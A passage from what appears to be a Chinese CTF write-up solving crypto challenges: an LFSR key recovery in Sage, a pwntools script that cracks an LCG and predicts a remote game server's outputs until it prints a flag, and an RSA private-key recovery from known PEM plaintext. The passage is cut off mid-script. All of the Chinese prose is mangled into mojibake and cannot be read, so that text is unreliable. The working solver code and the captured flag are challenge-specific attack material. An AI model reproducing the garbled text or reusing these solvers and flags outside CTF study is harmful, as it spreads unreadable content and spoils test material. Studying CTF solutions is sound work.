ä¸ºçŸ©é˜µæ²¡æœ‰æ»¡ç§©ä»è€Œè§£ä¸å‡ºkeyæ¥ã€‚</p><p>ç„¶åè¿™é‡Œæˆ‘æ¢äº†ä¸ªæ€è·¯ï¼Œæˆ‘ç¡¬çŒœï¼Œè¦æ±‚å‰ä¹æ¬¡çŒœä¸­ä¸€ä¸ªï¼Œè¿™æ ·æˆ‘å°±å¯ä»¥å¤šæ‹¿ä¸¤ç»„æ•°æ®ï¼ˆå…¶å®å¤šæ‹¿ä¸€æ¬¡å°±å¤Ÿäº†ï¼‰</p><p>è¿™æ ·æˆ‘å°±èƒ½æ‹¿åˆ°80bitçš„è¾“å‡ºï¼Œç„¶åæˆ‘ç”¨ä¸‹é¢é‚£ä¸ªsageè„šæœ¬ï¼Œæ ¹æ®wikiæ‰€è¿°æ„é€ çŸ©é˜µï¼Œè§£ä¸ªçº¿æ€§æ–¹ç¨‹ï¼Œå¾—åˆ°keyã€‚<del>ç‚¹è§£å¯†çš„æ—¶å€™è¦æ”¾ã€Šå¥½è¿æ¥ã€‹ï¼Œå¢åŠ è§£å¯†æˆåŠŸçš„æ¦‚ç‡ï¼Œå”±ã€Šå›½æ­Œã€‹åº”è¯¥ä¹Ÿå¯ä»¥ã€‚</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">output = &apos;10100010010100010010101001100110000000000111101111011101010101000111110011111011&apos;</span><br><span class="line"></span><br><span class="line">N = 39</span><br><span class="line">F = GF(2)</span><br><span class="line">ans=[]</span><br><span class="line">out = output</span><br><span class="line">Sn = [vector(F,N) for j in range(N+1)]</span><br><span class="line">for j in range(N+1):</span><br><span class="line">    Sn[j] = list(map(int,out[j:j+N]))</span><br><span class="line">    </span><br><span class="line">X = matrix(F,Sn[:N])</span><br><span class="line">invX = (X^-1)</span><br><span class="line">Y = vector(F,Sn[-1])</span><br><span class="line">Cn = Y * invX</span><br><span class="line">res = &apos;&apos;.join(str(i) for i in Cn)</span><br><span class="line">ans.append(int(res[::-1],2))</span><br><span class="line">print (ans)</span><br><span class="line">print(len(ans))</span><br><span class="line"></span><br><span class="line">&gt;&gt; [71834525659]</span><br><span class="line">&gt;&gt; 1</span><br></pre></td></tr></table></figure><p>ç”¨äºäº¤äº’çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span><span class="params">(states, modulus, multiplier)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ©ç”¨ä¼ªéšæœºåºåˆ—s,æ¨¡æ•°n,ä¹˜æ•°mï¼Œæ¢å¤å¢æ•°c</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    states:ä¼ªéšæœºæ•°åºåˆ—s</span></span><br><span class="line"><span class="string">    modulus:æ¨¡æ•°nï¼Œ</span></span><br><span class="line"><span class="string">    multiplier:ä¹˜æ•°m</span></span><br><span class="line"><span class="string">    incrementï¼šå¢é‡c</span></span><br><span class="line"><span class="string">    return:æ ¹æ®n,m,s0,s1æ¢å¤cï¼Œå¹¶è¿”å›</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span><span class="params">(states, modulus)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ©ç”¨ä¼ªéšæœºåºåˆ—så’Œæ¨¡æ•°nï¼Œæ¢å¤ä¹˜æ•°m</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    states:ä¼ªéšæœºæ•°åºåˆ—s</span></span><br><span class="line"><span class="string">    modulus:æ¨¡æ•°nï¼Œ</span></span><br><span class="line"><span class="string">    multiplier:ä¹˜æ•°m</span></span><br><span class="line"><span class="string">    return:æ ¹æ®n,s0,s1,s2æ¢å¤mï¼Œç„¶ååˆ©ç”¨crack_unknown_incrementæ¢å¤c</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * inverse(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span><span class="params">(states)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    åˆ©ç”¨åˆå€¼å’ŒéšåLCGäº§ç”Ÿçš„è¿ç»­çš„å‡ ä¸ªå€¼,æ¢å¤æ¨¡æ•°n</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    modulus:æ¨¡æ•°n</span></span><br><span class="line"><span class="string">    states:ä¼ªéšæœºæ•°åºåˆ—s</span></span><br><span class="line"><span class="string">    diffs:ç›¸é‚»éšæœºæ•°sçš„å·®å€¼ï¼štåºåˆ—</span></span><br><span class="line"><span class="string">              zeroes:ä¸tç³»åˆ—æœ‰å…³çš„å·®å€¼ï¼Œzeroes = t2*t0 - t1*t1,t0,t1,t2ç›¸é‚»</span></span><br><span class="line"><span class="string">    return:æ ¹æ®n,s0,s1,s2æ¢å¤mï¼Œç„¶ååˆ©ç”¨crack_unknown_incrementæ¢å¤c</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lcg</span><span class="params">(seed,params)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    LCGç®—æ³•</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    params:(multiplier,increment,modulus)</span></span><br><span class="line"><span class="string">    seed:ä¼ªéšæœºåºåˆ—ä¸­ç¬¬ä¸€ä¸ªå€¼s0</span></span><br><span class="line"><span class="string">    returnï¼šè¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼Œå…¶ä¸­çš„å€¼æ˜¯ç§é’¥åºåˆ—</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    (m,c,n)=params</span><br><span class="line">    x = seed % n</span><br><span class="line">    <span class="keyword">yield</span> int(x)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = (m * x + c) % n</span><br><span class="line">        <span class="keyword">yield</span> int(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(pri,pub,c,p)</span>:</span>    </span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ElGamalè§£å¯†ç®—æ³•</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    pri:ä¸€æ–¹ç§é’¥</span></span><br><span class="line"><span class="string">    pub:å¦ä¸€æ–¹å…¬é’¥</span></span><br><span class="line"><span class="string">    sharekey:åŒæ–¹åå•†å¯†é’¥</span></span><br><span class="line"><span class="string">    c:å¯†æ–‡</span></span><br><span class="line"><span class="string">    p:æ¨¡æ•°</span></span><br><span class="line"><span class="string">    m:æ˜æ–‡</span></span><br><span class="line"><span class="string">    return:è¿”å›æ˜æ–‡å­—ç¬¦</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    sharekey = pow(pub,pri,p)</span><br><span class="line">    m=long_to_bytes(c*inverse(sharekey,p)%p)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n, key, r, b)</span>:</span></span><br><span class="line">        self.n = n<span class="comment">#40</span></span><br><span class="line">        self.key = key </span><br><span class="line">        self.r = r &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.b = b<span class="comment">#8</span></span><br><span class="line">                 </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">out</span><span class="params">(self)</span>:</span></span><br><span class="line">        o = self.r &amp; <span class="number">1</span></span><br><span class="line">        p = self.r &amp; self.key</span><br><span class="line">        q = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p:</span><br><span class="line">            q = q + p &amp; <span class="number">1</span></span><br><span class="line">            p = p &gt;&gt; <span class="number">1</span></span><br><span class="line">        q = q &amp; <span class="number">1</span></span><br><span class="line">        t = q &lt;&lt; (self.n - <span class="number">2</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.r = t | (self.r &gt;&gt; <span class="number">1</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.b):</span><br><span class="line">            o = self.out()</span><br><span class="line">            res |=  o &lt;&lt; (self.b - <span class="number">1</span> - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getr</span><span class="params">(s)</span>:</span></span><br><span class="line">    r = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> b:</span><br><span class="line">            r = each+r</span><br><span class="line">    <span class="keyword">print</span> int(r,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> int(r,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getk</span><span class="params">(s)</span>:</span></span><br><span class="line">    k=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        b = bin(i)[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> b:</span><br><span class="line">            k += each</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line">        </span><br><span class="line">sh = remote(<span class="string">'59.110.243.101'</span>,<span class="string">'5123'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Your choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Baby:"</span>)</span><br><span class="line">Baby = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Easy:"</span>)</span><br><span class="line">Easy = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Normal:"</span>)</span><br><span class="line">Normal = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Hard:"</span>)</span><br><span class="line">Hard = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Master:"</span>)</span><br><span class="line">Master = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line">sh.recvuntil(<span class="string">"Crazy:"</span>)</span><br><span class="line">Crazy = sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">pri=[Baby,Easy,Normal,Hard,Master,Crazy]</span><br><span class="line"></span><br><span class="line">(n,m,c)=crack_unknown_modulus([int(each) <span class="keyword">for</span> each <span class="keyword">in</span> pri])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=int(pri[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">key = lcg(x,(m,c,n))</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    next(key)</span><br><span class="line">choice = next(key)</span><br><span class="line">sh.recvuntil(<span class="string">"Input the level code:\n"</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(str(choice))</span><br><span class="line">sh.recvuntil(<span class="string">"Your choice:\n"</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line"><span class="comment">#flag=""</span></span><br><span class="line">s=[]</span><br><span class="line">F = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    ans = sh.recvuntil(<span class="string">"The answer is "</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Right'</span> <span class="keyword">in</span> ans:</span><br><span class="line">        F = <span class="number">1</span></span><br><span class="line">        print(<span class="string">"NICE"</span>)</span><br><span class="line">    s.append(int(sh.recvuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> F == <span class="number">1</span>:</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(<span class="string">"0"</span>)</span><br><span class="line">    ans = sh.recvuntil(<span class="string">"The answer is "</span>)</span><br><span class="line">    s.append(int(sh.recvuntil(<span class="string">"!"</span>)[:<span class="number">-1</span>]))</span><br><span class="line">    </span><br><span class="line">r = getr(s[:<span class="number">5</span>])</span><br><span class="line">output = getk(s[:])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"r:"</span>+str(r)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"output:"</span>+ output</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">k = input(<span class="string">"k:"</span>)</span><br><span class="line">game = Game(<span class="number">40</span>,k,r,<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    next(game)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    sh.recvuntil(<span class="string">"Input your answer:\n"</span>)</span><br><span class="line">    sh.sendline(str(next(game)))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[DEBUG] Received <span class="number">0x3f</span> bytes:</span><br><span class="line">    <span class="string">'Your coin: 500\n'</span></span><br><span class="line">    <span class="string">'You Win!\n'</span></span><br><span class="line">    <span class="string">'flag&#123;12727f129b72e685388c6a67538ee9b0&#125;\n'</span></span><br></pre></td></tr></table></figure><p>æœ€åäº”åˆ†é’Ÿå‡ºflagï¼Œå¤ªå¹¸è¿äº†ã€‚<del>å°±æ˜¯æ²¡é˜Ÿä¼ï¼Œæœ‰ç‚¹æµªè´¹äº†</del>ã€‚</p><h1 id="ç„æ­¦ç»„"><a href="#ç„æ­¦ç»„" class="headerlink" title="ç„æ­¦ç»„"></a>ç„æ­¦ç»„</h1><h2 id="Safe-box"><a href="#Safe-box" class="headerlink" title="Safe_box"></a>Safe_box</h2><p>ä¸»è¦é€»è¾‘</p><ol><li>è¿‡äº†PoWè¿›è¡Œäº¤äº’</li><li>1å¯ä»¥å¾—åˆ°ä¸€ç»„23*20çš„key</li><li>3å¯ä»¥å¾—åˆ°flagçš„å¯†æ–‡c</li><li>åŠ å¯†å‡½æ•°ç”Ÿæˆ23*40çš„keyï¼Œä¸€å…±23ç»„æ˜æ–‡ï¼Œæ¯ç»„æ˜æ–‡åŠ å¯†40æ¬¡ï¼Œè®°å½•æ¯æ¬¡çš„ç»“æœ</li><li>æ¯ä¸€æ¬¡çš„åŠ å¯†é€»è¾‘ä¸ºb = m + Î£((a_j*<em>i)</em>e_i)ï¼Œå…¶ä¸­a_jä¸ºç»„é‡Œçš„åŠ å¯†æ¬¡æ•°ï¼Œj=1ï¼Œ2ï¼Œï¼Œ40ï¼›e_iä¸ºåˆ—è¡¨eé‡Œçš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œi = 1ï¼Œ2ï¼Œ3ï¼Œï¼Œ,29</li></ol><p>è§£å¯†æµç¨‹</p><ol><li>ç¬¬ä¸€ç»„ï¼Œå½“i=0æ—¶ï¼Œa=1ï¼Œb_1 = m_1 + Î£(e_i)</li><li>ç¬¬äºŒç»„ï¼Œå½“i=0æ—¶ï¼Œa=1ï¼Œb_2 = m_2 + Î£(e_i)</li><li>ç¬¬ä¸‰ç»„ï¼Œå½“i=0æ—¶ï¼Œa=1ï¼Œb_3 = m_3 + Î£(e_i)</li><li>æˆ‘ä»¬å¾—åˆ°çš„23ç»„ä¿¡æ¯ä¸­çš„æ¯ç»„çš„ç¬¬ä¸€æ¡å°±æ˜¯b_1, b_2ï¼Œb_3</li><li>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è·å¾—Î£(e_i)å°±å¯ä»¥è¿˜åŸæ‰€æœ‰çš„m</li><li>è¢«åŠ å¯†çš„æ˜¯priï¼Œpriæ˜¯PEMæ–‡ä»¶æ ¼å¼ï¼Œæœ‰å›ºå®šçš„å¼€å¤´ã€ç»“å°¾æ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“éƒ¨åˆ†æ˜æ–‡ï¼Œæ‰€ä»¥æˆ‘ä»¬çŸ¥é“m_1</li><li>åˆ©ç”¨b_1å’Œm_1è·å–Î£(e_i)</li><li>å†åˆ©ç”¨b_1,,,b_23å’ŒÎ£(e_i) è·å–æ‰€æœ‰m</li><li>å†åˆ©ç”¨ç§é’¥æ–‡ä»¶å¯¹flagè¿›è¡Œè§£å¯†</li></ol><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'data.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">ms = re.findall(<span class="string">"&#123;'a': 1, 'b': (.*?)L&#125;"</span>,data)</span><br><span class="line">c = re.findall(<span class="string">"flag:(.*)"</span>,data)</span><br><span class="line">m1 = <span class="string">b'-----BEGIN RSA PRIVATE KEY-----\\nMIICXAIB'</span></span><br><span class="line">es = int(ms[<span class="number">0</span>])-bytes_to_long(m1)</span><br><span class="line"><span class="keyword">print</span> es</span><br><span class="line">pri=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ms:</span><br><span class="line">    pri = pri + long_to_bytes(int(i)-es)</span><br><span class="line"><span class="keyword">print</span> pri</span><br><span class="line">pri = RSA.importKey(pri.replace(<span class="string">"\\"</span><span class="string">","</span><span class="string">"))</span></span><br><span class="line"><span class="string">print(long_to_bytes(pow(int(c[0]),pri.d,pri.n)))</span></span><br></pre></td></tr></table></figure><h2 id="easy-wa"><a href="#easy-wa" class="headerlink" title="easy_wa"></a>easy_wa</h2><p>bytectfåŸé¢˜lrlrçš„ä¸€ä¸ªpart</p><p><a href="https://blog.csdn.net/qq_33458986/article/details/100699263" target="_blank" rel="noopener">https://blog.csdn.net/qq_33458986/article/details/100699263</a></p><p>calcæ˜¯ä¸€ä¸ªå¤šé¡¹å¼åœ¨GF(2)ä¸‹çš„å¹³æ–¹è¿ç®—ï¼Œæˆ‘ä»¬è¦åšçš„åº”è¯¥æ˜¯æ±‚æ ¹ã€‚</p><p>ä½†æ˜¯è¿™é‡Œç»™å‡ºçš„æ—¢çº¦å¤šé¡¹å¼çš„é˜¶ä¸å¤§ï¼Œæˆ‘ä»¬ä¸€ç›´å¹³æ–¹ä¸‹å»ï¼Œå¾ˆå¿«å°±èƒ½å›åˆ°èµ·ç‚¹ã€‚æ‰€ä»¥ç›´æ¥æ‹¿å¯†æ–‡å»calcå°±è¡Œäº†ã€‚</p><p>å…ˆäº¤äº’ï¼Œè¿‡é‚£ä¸ªæ¶å¿ƒçš„PoW <del>è·Ÿé’é¾™ç»„é‚£ä¸ªä¸€æ ·ï¼Œå†çœ‹çœ‹åå­—ï¼ŒåŒä¸€ä¸ªå‡ºé¢˜äººï¼Œå‡‘ï¼</del>ï¼Œè¾“å…¥tokenæ‹¿åˆ°4ç»„å¯†æ–‡</p><p>ç„¶åæ¯ç»„åˆ†åˆ«è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom <span class="keyword">as</span> ua</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">magic=<span class="number">32805</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(m,p)</span>:</span></span><br><span class="line">    res=<span class="number">0</span></span><br><span class="line">    lens=hlen(p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bin(m)[<span class="number">2</span>:]:</span><br><span class="line">        res*=<span class="number">2</span></span><br><span class="line">        res^=m <span class="keyword">if</span> i==<span class="string">'1'</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        res^=p <span class="keyword">if</span> hlen(res) == lens <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"flag&#123;0123456789bcde-_&#125;\x00"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">flags=[<span class="number">3723147309</span>,<span class="number">8016759097521062564</span>,<span class="number">267529443716352603115102819467183104162</span>,<span class="number">110068498753042154535753131190467876514149603112955078214309283006458454378660</span>]</span><br><span class="line">FLAG=<span 